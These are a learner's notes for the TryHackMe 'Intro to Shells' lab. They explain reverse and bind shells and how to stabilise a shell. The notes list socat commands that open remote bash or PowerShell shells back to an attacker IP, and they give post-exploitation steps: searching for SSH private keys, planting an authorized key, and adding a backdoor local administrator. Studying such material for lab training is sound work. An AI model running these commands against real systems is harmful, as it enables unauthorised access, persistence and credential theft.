# Introtoshell

[link to the room](https://tryhackme.com/room/introtoshells)


## links
- [pentestmonkey Reverse Shell Cheat Sheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## types of shells

### reverse shell
 the target is forced to execute code that connects back to your computer.
 Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target.

### bind shell
the code executed on the target is used to start a listener attached to a shell directly on the target.
This would then be opened up to the internet.
you can connect to the port that the code has opened and obtain RCE.
the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

NB: in most reverse/bind shell are non interactive means we can not execute commands that are interactive like `ssh` or `su`.

## shell stabilisation

### python
- uses Python to spawn a better featured bash shell: `python -c 'import pty;pty.spawn("/bin/bash")'` 
- `export TERM=xterm` give us access to term commands such as `clear`
- CTrl+Z `stty raw -echo; fg` turns off our own terminal echo and foregrounds the shell.
- `reset` fix terminal input
- change the registered width and height of the terminal: in own machine term `stty -a` look for rows/columns, in reverse/bind shell `stty rows/cols <number>`

### rlwrap
gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell.
- `rlwrap nc -lvnp <port>` This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise.

### socat
limited to Linux targets(stabilisation), first transfer a socat static compiled binary up to the target machine




## socat

### reverse shell
on attacker machine:
`socat TCP-L:<port> -`
    - stable and full tty: `socat TCP-L:<port> FILE:``tty``,raw,echo=0`
on target machine:
- windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
- linux: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
    - stable and full tty: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### bind shell
on target machine:
- windows: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
- linux: `socat TCP-L:<PORT> EXEC:"bash -li"`
on attacker machine: 
`socat TCP:<TARGET-IP>:<TARGET-PORT> -`



## next step

### linux
- look for id_rsa, or add own pubkey in authorized_hosts

### windows
- add a user to localgroup administrators
```
net user <username> <password> /add
net localgroup administrators <username> /add
```
- login using RDP
```
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<IP> /u:<USER> /p:'<PSSWD>'
```
